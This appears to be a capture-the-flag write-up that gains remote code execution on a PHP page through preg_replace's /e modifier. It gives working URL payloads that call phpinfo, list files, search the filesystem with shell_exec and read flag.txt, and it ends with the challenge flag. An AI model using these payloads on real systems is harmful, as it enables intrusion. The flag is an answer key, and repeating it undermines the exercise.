# substitute

By simply looking at the source code we can't understand what could be vulnerable.
```php
<?php
        $input = "Can you replace Admin??";
        if(isset($_GET["vector"]) && isset($_GET["replace"])){
                $pattern = $_GET["vector"];
                $replacement = $_GET["replace"];
                echo preg_replace($pattern,$replacement,$input);
        }else{
                echo $input;
        }
?>
```

But there is a major vulnerability in place here: **`preg_replace`**
By looking it up on hacktricks we can find this interesting page: https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#rce-via-preg_replace

This is the relevant part:
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```

So we can get remote code execution on this website.

After crafing this payload:
```php
/?vector=/Admin/e&replace=phpinfo()
```
We get the php info page. So we now know we can get rce.

So I tried:
```php
/?vector=/Admin/e&replace=shell_exec("ls")
```
As an output I get this:
```sh
here_we_dont_have_flag 
index.php
```

So I decided to do a simple search for the flag file from root:
```php
/?vector=/Admin/e&replace=shell_exec(%22find%20/%20-type%20f%20-name%20%27flag*%27%22)
```
This way I get:
```sh
/sys/devices/pnp0/00:05/00:05:0/00:05:0.0/tty/ttyS2/flags 
/sys/devices/pnp0/00:03/00:03:0/00:03:0.0/tty/ttyS0/flags 
/sys/devices/pnp0/00:06/00:06:0/00:06:0.0/tty/ttyS3/flags 
/sys/devices/pnp0/00:04/00:04:0/00:04:0.0/tty/ttyS1/flags 
/sys/devices/virtual/net/lo/flags 
/sys/devices/virtual/net/eth0/flags 
/var/www/html/here_we_dont_have_flag/flag.txt
```

So we can do a payload to cat the flag.txt file:
```php
/?vector=/Admin/e&replace=shell_exec(%22tac%20/var/www/html/here_we_dont_have_flag/flag.txt%22)
```

flag: `CTF{92b435bcd2f70aa18c38cee7749583d0adf178b2507222cf1c49ec95bd39054c}`